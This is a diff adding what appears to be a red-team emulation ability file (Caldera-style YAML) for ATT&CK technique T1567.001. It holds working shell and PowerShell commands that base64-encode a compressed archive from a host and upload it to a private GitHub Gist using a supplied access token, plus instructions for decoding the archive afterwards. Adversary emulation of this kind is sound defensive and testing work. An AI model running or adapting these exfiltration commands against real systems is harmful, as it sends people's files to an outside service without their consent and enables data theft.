@@ -1,0 +1,50 @@
+- id: 0582dc26-e0cf-4645-88cf-f37a02279976
+  name: Exfil Compressed Archive to Github Gist
+  description: |
+    This ability exfiltrates a compressed archive to Github Gists (Base64 Encoded). To reconstitute, save
+    the base64 string from the Gist and run ----
+    (Powershell) [Convert]::FromBase64String($(Get-Content b64.txt)) | set-content archive.extension -encoding byte ----
+    (Linux) cat b64.txt | base64 -d > archive.extension
+  tactic: exfiltration
+  technique:
+    attack_id: T1567.001
+    name: Exfiltration to Code Repository
+  platforms:
+    linux:
+      sh:
+        command: | # Temporary file needed to avoid curl length restrictions
+          GHUser="#{github.user.name}";
+          GHPAT="#{github.access.token}";
+          FileContent=$(base64 #{host.dir.compress});
+          LocalFile='#{host.dir.compress}';
+          RemoteFile="$(date '+%Y%m%d%H%M%S')-exfil-#{paw}-$(basename $LocalFile)";
+          tmp_file=$(mktemp);
+          echo "{\"public\": false,\"files\": {\"$RemoteFile\": {\"content\": \"${FileContent}\"}}}" > $tmp_file;
+          curl --silent --output /dev/null --show-error --fail -X POST -d @$tmp_file -u $GHUser:$GHPAT https://api.github.com/gists;
+          rm $tmp_file
+    windows:
+      psh:
+        command: |
+          $GHUser = "#{github.user.name}";
+          $GHPAT = "#{github.access.token}";
+          $File = Get-Item -Path "#{host.dir.compress}";
+          $Token = $GHUser + ":" + $GHPAT;
+          $EncodedToken = [System.Convert]::ToBase64String([char[]]$Token);
+
+          $RemoteName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-paw-$($File.name)";
+          $FileContent = [Convert]::ToBase64String([IO.File]::ReadAllBytes($File));
+
+          $StringContent = @{
+              files = @{$RemoteName = @{content = $FileContent}};
+              public = $False;
+          } | ConvertTo-Json;
+          $URL = "https://api.github.com/gists";
+          $Body = $StringContent;
+          $Headers = @{
+              "content-type" = "application/json";
+              "Authorization" = 'Basic {0}' -f $EncodedToken;
+          };
+          Invoke-WebRequest -Uri $URL -Method POST -Body $Body -Headers $Headers 1>$null -UseBasicParsing;
+  requirements:
+    - plugins.stockpile.app.requirements.paw_provenance:
+        - source: host.dir.compress
